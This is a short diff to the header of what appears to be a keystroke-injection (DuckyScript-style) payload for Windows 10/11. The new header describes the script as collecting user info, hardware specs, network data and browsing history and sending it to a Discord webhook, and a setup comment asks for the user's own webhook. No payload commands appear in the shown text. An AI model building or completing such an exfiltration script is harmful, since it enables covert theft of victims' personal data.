@@ -1,5 +1,18 @@
-REM Github.com/murdervan
-REM Windows 10/11
+REM ###########################################################
+REM #                                                         #
+REM # Title        : System Info Exfiltration to discord      #
+REM # Author       : Murdervan                                #
+REM # Link         : github.com/murdervan                     #
+REM # Target       : Windows 10/11                            #
+REM # Description  : This script gathers system details,      #
+REM #                in cluding user info, hardware specs,    #
+REM #                network data, and browsing history,      #
+REM #                then sends it to a Discord webhook.      #
+REM #                                                         #
+REM ###########################################################
+
+
+
 REM SETUP
 REM replace YOUR_WEBHOOK_HERE (below) with your discord webhook.
 
